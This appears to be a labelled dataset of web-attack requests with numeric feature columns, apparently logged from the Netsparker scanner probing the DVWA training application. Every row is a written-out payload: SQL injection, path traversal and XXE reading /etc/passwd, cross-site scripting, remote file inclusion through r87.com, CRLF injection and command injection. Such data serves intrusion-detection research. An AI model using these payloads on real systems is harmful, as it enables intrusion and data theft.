145,2,200,1007,35,48,27,4,0,GET /DVWA/vulnerabilities/view_source.php?id=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201&security=low HTTP/1.1
126,2,200,997,33,44,22,4,0,GET /DVWA/vulnerabilities/view_source.php?id=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))&security=low HTTP/1.1
272,2,200,1052,61,94,56,4,0,GET /DVWA/vulnerabilities/view_source.php?id=1%20procedure%20analyse(extractvalue(rand()%2cconcat(0x3a%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))))%2c1)--%201&security=low HTTP/1.1
135,2,200,999,33,45,25,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22&security=low HTTP/1.1
135,2,200,1000,33,45,25,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1
353,2,200,1100,128,66,74,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%27%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27&security=low HTTP/1.1
226,2,200,1025,33,91,54,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
379,2,200,1095,61,134,85,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%5c%27%2b(select%201%20and%20row(1%2c1)%3e(select%20count(*)%2cconcat(CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))%2c0x3a%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))--%201&security=low HTTP/1.1
108,2,200,987,23,43,16,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1)%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1
227,2,200,1026,33,91,55,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
109,2,200,988,23,43,17,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1
228,2,200,1026,33,91,56,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
99,2,200,972,11,61,9,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%0ans%3anetsparker056650%3dvuln HTTP/1.1
102,2,200,972,11,62,10,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
73,2,200,972,11,42,7,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2527 HTTP/1.1
110,2,200,971,23,44,16,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
186,2,200,972,11,93,27,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%2b%20(select%20convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns)%20%2b%27 HTTP/1.1
165,2,200,972,11,91,20,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=(select%20convert(int%2ccast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns) HTTP/1.1
135,2,200,972,11,81,17,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20netsparker056650%3dvuln HTTP/1.1
92,2,200,971,13,53,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=hTTp%3a%2f%2fr87.com%2fn HTTP/1.1
102,2,200,972,11,59,14,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=http%3a%2f%2fr87.com%2fn%3f%00.php HTTP/1.1
96,2,200,972,11,60,8,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=ns%3anetsparker056650%3dvuln HTTP/1.1
94,2,200,972,11,47,13,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=ping%20-c%2025%20127.0.0.1 HTTP/1.1
100,2,200,972,11,47,15,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1
95,2,200,975,11,59,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=file%3a%2f%2f%2fetc%2fpasswd&security=low HTTP/1.1
134,2,200,998,11,80,17,4,0,GET /DVWA/vulnerabilities/view_source.php?id=http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20netsparker056650%3dvuln&security=low HTTP/1.1
93,2,200,975,11,54,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=http%3a%2f%2fr87.com%2f%3f&security=low HTTP/1.1
95,2,200,983,11,59,8,4,0,GET /DVWA/vulnerabilities/view_source.php?id=ns%3anetsparker056650%3dvuln&security=low HTTP/1.1
72,2,200,967,16,41,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=NSFTW&security=low HTTP/1.1
89,2,200,982,14,50,9,4,0,GET /DVWA/vulnerabilities/view_source.php?id=print(int)0xFFF9999-22&security=low HTTP/1.1
251,2,200,1039,38,102,57,4,1,GET /DVWA/vulnerabilities/view_source.php?id=syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
106,2,200,1250,13,54,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%22%20ns%3d%20netsparker(0x0005AD)%20 HTTP/1.1
114,2,200,1249,12,65,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%3e%3cnet%20sparker%3dnetsparker(0x0005B6)%3e HTTP/1.1
114,2,200,1249,12,65,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%3e%3cnet%20sparker%3dnetsparker(0x0005B7)%3e HTTP/1.1
101,2,200,1214,12,53,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2fr87.com%2fn%2fj%2f%3f0x0005B4 HTTP/1.1
101,2,200,1249,12,53,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2fr87.com%2fn%2fj%2f%3f0x0005B5 HTTP/1.1
102,2,200,1250,12,55,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2fr87.com%2fn%2fn.css%3f0x0005B2 HTTP/1.1
102,2,200,1249,12,55,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2fr87.com%2fn%2fn.css%3f0x0005B3 HTTP/1.1
98,2,200,1250,13,54,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%20ns%3dnetsparker(0x0005AE)%20 HTTP/1.1
98,2,200,1250,13,54,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%20ns%3dnetsparker(0x0005AF)%20 HTTP/1.1
92,2,200,978,21,45,11,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%22%7c%7cNETSPARKER%7c%7c&security=low HTTP/1.1
163,2,200,980,24,50,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&security=low HTTP/1.1
110,2,200,980,15,72,10,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2fDVWA%2fvulnerabilities%2fview_source.php&security=low HTTP/1.1
82,2,200,971,11,52,8,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2fetc%2fpasswd&security=low HTTP/1.1
103,2,200,977,11,71,9,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2fvulnerabilities%2fview_source.php&security=low HTTP/1.1
106,2,200,995,23,56,9,4,1,GET /DVWA/vulnerabilities/view_source.php?id=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1&security=low HTTP/1.1
141,2,200,979,11,67,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&security=low HTTP/1.1
147,2,200,972,24,73,21,7,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005B0)%3C/scRipt%3E HTTP/1.1
147,2,200,972,24,73,21,7,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005B1)%3C/scRipt%3E HTTP/1.1
149,2,200,972,11,73,20,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%2bconvert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%2b%27 HTTP/1.1
111,2,200,972,23,44,17,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
112,2,200,972,23,44,18,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
153,2,200,972,14,64,21,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27AND%201%3dcast(0x5f21403264696c656d6d61%20as%20varchar(8000))%20or%20%271%27%3d%27 HTTP/1.1
151,2,200,972,11,76,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror.log HTTP/1.1
141,2,200,972,11,66,40,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2 HTTP/1.1
148,2,200,972,11,69,42,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2%00.php HTTP/1.1
364,2,200,972,128,71,75,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20or%201%3d1%20and%20(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) HTTP/1.1
108,2,200,936,23,44,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
381,2,200,972,128,74,80,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 HTTP/1.1
109,2,200,972,23,44,16,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
110,2,200,972,23,44,17,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
229,2,200,972,33,92,56,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
137,2,200,972,11,71,16,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000))) HTTP/1.1
110,3,200,1301,11,70,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=low&nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
113,3,200,1301,11,71,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=low&nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
78,2,200,972,15,45,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=N3tSp4rK3R HTTP/1.1
104,2,200,972,23,44,14,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
83,2,200,975,11,49,9,7,0,GET /DVWA/vulnerabilities/view_source.php?id=http://r87.com/?&security=low HTTP/1.1
77,2,200,974,15,44,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=N3tSp4rK3R&security=low HTTP/1.1
85,2,200,968,11,54,8,4,0,GET /DVWA/vulnerabilities/view_source.php?id=view_source.php%00&security=low HTTP/1.1
82,2,200,967,11,54,7,4,0,GET /DVWA/vulnerabilities/view_source.php?id=view_source.php&security=low HTTP/1.1
92,2,200,1250,12,53,10,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%0anetsparker(0x0005D0)%3b HTTP/1.1
92,2,200,1250,13,51,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%20netsparker(0x0005CE)%20 HTTP/1.1
92,2,200,1250,13,51,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%20netsparker(0x0005CF)%20 HTTP/1.1
98,2,200,1250,12,53,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%2bnetsparker(0x0005C8)%2b%22 HTTP/1.1
98,2,200,1250,12,53,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%2bnetsparker(0x0005C9)%2b%22 HTTP/1.1
114,2,200,1249,12,65,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%3e%3cnet%20sparker%3dnetsparker(0x0005B8)%3e HTTP/1.1
114,2,200,1249,12,65,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%3e%3cnet%20sparker%3dnetsparker(0x0005B9)%3e HTTP/1.1
114,2,200,1250,13,55,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%26%2339%3b%2cnetsparker(0x0005CC)%2c%26%2339%3b HTTP/1.1
114,2,200,1250,13,55,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%26%2339%3b%2cnetsparker(0x0005CD)%2c%26%2339%3b HTTP/1.1
98,2,200,1250,12,53,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2bnetsparker(0x0005C6)%2b%27 HTTP/1.1
98,2,200,1250,12,53,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2bnetsparker(0x0005C7)%2b%27 HTTP/1.1
105,2,200,1250,15,58,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%3cscRipt%3ens(0x0005BE)%3c%2fscRipt%3e HTTP/1.1
105,2,200,1250,15,58,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%3cscRipt%3ens(0x0005BF)%3c%2fscRipt%3e HTTP/1.1
107,2,200,1250,13,57,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%5c%27%3bnetsparker(0x0005CA)%3b%2f%2f%2f HTTP/1.1
107,2,200,1250,13,57,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%5c%27%3bnetsparker(0x0005CB)%3b%2f%2f%2f HTTP/1.1
97,2,200,1250,12,54,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=*%2fnetsparker(0x0005C4)%3b%2f* HTTP/1.1
97,2,200,1250,12,54,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=*%2fnetsparker(0x0005C5)%3b%2f* HTTP/1.1
112,2,200,1250,12,69,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=body%7bx%3aexpression(netsparker(0x0005C2))%7d HTTP/1.1
112,2,200,1250,12,69,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=body%7bx%3aexpression(netsparker(0x0005C3))%7d HTTP/1.1
99,2,200,1250,13,62,9,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=javascript%3anetsparker(0x0005BA) HTTP/1.1
99,2,200,1251,13,62,9,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=javascript%3anetsparker(0x0005BB) HTTP/1.1
110,2,200,1250,12,67,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=n%3bns%3aexpression(netsparker(0x0005C0))%3b HTTP/1.1
110,2,200,1250,12,67,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=n%3bns%3aexpression(netsparker(0x0005C1))%3b HTTP/1.1
110,2,200,990,14,54,16,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%7b%24%7bprint(int)0xFFF9999-22%7d%7d%27&security=low HTTP/1.1
89,2,200,973,11,50,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f%2f%2fr87.com%2f%3f&security=low HTTP/1.1
86,2,200,974,11,49,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f%5cr87.com%2f%3f&security=low HTTP/1.1
250,2,200,1037,40,102,47,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e&security=low HTTP/1.1
135,2,200,986,11,75,21,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e&security=low HTTP/1.1
113,2,200,990,14,62,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%5bphp%5dprint(int)0xFFF9999-22%3b%5b%2fphp%5d&security=low HTTP/1.1
113,2,200,991,14,62,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%7bphp%7dprint(int)0xFFF9999-22%3b%7b%2fphp%7d&security=low HTTP/1.1
93,2,200,972,21,46,11,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%22%7c%7cNETSPARKER%7c%7c HTTP/1.1
191,2,200,972,28,73,24,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x0005BC%2529%253C%252FscRipt%253E HTTP/1.1
191,2,200,972,28,73,24,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x0005BD%2529%253C%252FscRipt%253E HTTP/1.1
108,2,200,972,12,56,14,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%22%20ns%3d%20netsparker(0x0005D4)%20 HTTP/1.1
108,2,200,972,12,56,14,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%22%20ns%3d%20netsparker(0x0005D5)%20 HTTP/1.1
81,2,200,972,18,42,10,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security='%2BNSFTW%2B' HTTP/1.1
90,2,200,972,11,51,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f%2f%2fr87.com%2f%3f HTTP/1.1
87,2,200,971,11,50,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f%2fr87.com%2f%3f HTTP/1.1
87,2,200,972,11,50,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f%5cr87.com%2f%3f HTTP/1.1
151,2,200,972,11,76,40,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror_log HTTP/1.1
135,2,200,972,11,65,38,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion HTTP/1.1
151,2,200,972,11,76,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log HTTP/1.1
152,2,200,972,11,76,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log HTTP/1.1
251,2,200,972,40,103,47,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e HTTP/1.1
136,2,200,972,11,76,21,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e HTTP/1.1
97,2,200,972,11,54,16,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=((select%20sleep(25)))a--%201 HTTP/1.1
211,2,200,972,67,52,43,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=(SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))) HTTP/1.1
146,2,200,972,35,49,27,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201 HTTP/1.1
100,2,200,972,12,56,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1%20ns%3dnetsparker(0x0005D6)%20 HTTP/1.1
100,2,200,972,12,56,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1%20ns%3dnetsparker(0x0005D7)%20 HTTP/1.1
381,2,200,972,128,74,80,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=-1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22 HTTP/1.1
227,2,200,972,33,92,54,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
228,2,200,972,33,92,55,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
149,2,200,972,38,77,12,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNUQyKTwvc2NyaXB0Pg%3d%3d HTTP/1.1
149,2,200,972,38,77,12,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNUQzKTwvc2NyaXB0Pg%3d%3d HTTP/1.1
94,2,200,971,11,55,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=http%3a%2f%2fr87.com%2f%3f HTTP/1.1
99,2,200,972,11,59,13,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=http%3a%2f%2fr87.com%2fn%3f.php HTTP/1.1
84,2,200,936,11,50,9,7,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=http://r87.com/? HTTP/1.1
73,2,200,972,16,42,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=NSFTW HTTP/1.1
137,2,200,972,11,82,20,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.php HTTP/1.1
81,2,200,972,11,48,9,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=r87.com%2f%3f HTTP/1.1
79,2,200,972,11,48,8,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=r87.com%2fn HTTP/1.1
